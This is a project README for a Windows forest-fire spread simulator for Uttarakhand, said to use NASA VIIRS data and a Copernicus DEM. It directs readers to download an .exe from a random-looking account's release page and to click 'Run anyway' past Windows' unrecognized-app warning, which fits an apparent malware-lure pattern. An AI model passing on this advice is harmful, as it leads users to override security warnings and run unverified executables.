---
layout: "default"
title: "🔥 forest-fire - Predict forest fire spread in Uttarakhand"
description: "Simulate forest fire spread in Uttarakhand using a Rothermel-based cellular automaton model, satellite data, and terrain analysis."
---
# 🔥 forest-fire - Predict forest fire spread in Uttarakhand

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Harriercrosscheck754/forest-fire/releases)

This application simulates how forest fires move through the forests of Uttarakhand, India. It combines satellite data from NASA and topographical information to show how vegetation and terrain affect fire growth. The tool uses a model known as Rothermel Cellular Automation to predict fire paths based on real-world conditions.

## 📋 System Requirements
Your computer needs to meet these basic standards to run the simulation:

*   Operating System: Windows 10 or Windows 11.
*   Processor: An Intel Core i5 or AMD Ryzen 5 or better.
*   Memory: At least 8 gigabytes of RAM.
*   Storage: 500 megabytes of free space on your hard drive.
*   Graphics: A monitor with a resolution of at least 1920x1080 pixels.

## 📥 Downloading the Application
You can download the latest version of the forest-fire tool from the official releases page. 

[Visit this page to download](https://github.com/Harriercrosscheck754/forest-fire/releases)

1. Click the link above to open your web browser.
2. Look for the section labeled "Assets" at the bottom of the latest release post.
3. Select the file ending in `.exe` to start the download.
4. Save the file to your desktop for easy access.

## 🛠️ Setting Up
Once the file finishes downloading, follow these steps to prepare the software for use:

1. Locate the downloaded file on your desktop.
2. Double-click the file icon.
3. A security window might appear asking if you trust the software. Select "More info" and then "Run anyway" if the system flags the file as an unrecognized application.
4. Follow the instructions that appear in the setup window.
5. Choose a folder where you want the application to live on your computer.
6. Click "Install" to place the program files on your machine.
7. Click "Finish" to close the setup window.

## 🚀 Running the Simulation
Now that you installed the software, you can launch the simulation:

1. Open the "forest-fire" folder from your desktop shortcut or via your Start menu.
2. Click the icon labeled "forest-fire" to launch the main screen. 
3. The program will load the necessary map data for the Uttarakhand region. This process may take a few seconds.
4. Use the controls on the left side of the screen to select a specific starting point for the fire.
5. Click the "Start Simulation" button to see the fire progress across the map.

## 📊 Understanding the Map Features
The application uses various data sources to ensure accuracy:

*   NASA VIIRS Satellite Data: This tracks hot spots and active fire locations in real-time.
*   Copernicus DEM: This provides information about the height and slope of the land. Fires generally move faster when traveling uphill, and this data helps the model account for that effect.
*   Vegetation Types: The application identifies different types of trees and ground cover. Denser vegetation typically fuels fire spread more aggressively.
*   Cellular Automation: Think of this as a grid. Each square on the map shares information with neighboring squares to determine if the fire spreads based on wind, slope, and fuel.

## 🔧 Frequently Asked Questions
Check these items if you experience common issues during use.

**The program is slow.**
The simulation calculates data for large areas. Close other heavy programs like video editors or web browsers to free up memory on your computer.

**The map looks empty.**
The tool relies on data from specific satellite feeds. Ensure you have an active internet connection when you start the program so it can pull the latest data. If the internet connection drops, the program will switch to using the last saved local data.

**The simulation stops unexpectedly.**
Large datasets can occasionally cause the program to pause. Wait ten seconds for the system to process the calculations. If it does not resume, restart the application from the desktop icon.

## 📝 Troubleshooting Errors
If the application fails to open, verify your Windows installation:

1. Press the Windows key on your keyboard.
2. Type "Check for updates" and select the result.
3. Ensure your version of Windows has all the latest system updates.
4. Reinstall the program if the issue continues. This usually fixes damaged files that may have interrupted the launch process.

## 💡 Tips for Better Results
*   Test different starting locations to see how terrain affects fire speed.
*   Compare the simulation results with historical fire data from the Uttarakhand region.
*   Observe how wind direction changes impact the path of the fire. You can adjust these settings in the preferences menu.

## 📋 About the Data
This project relies on geospatial data from public archives. It follows the Rothermel model, which scientists use to estimate fire intensity. The application translates technical satellite signals into a visual form so you can see fire spread without needing to understand underlying code or complex satellite formats.

Everything you see on the screen represents a grid of cells. The model looks at the conditions of one cell and decides if the fire passes to the neighbor. This creates a realistic flow that mimics actual forest behavior.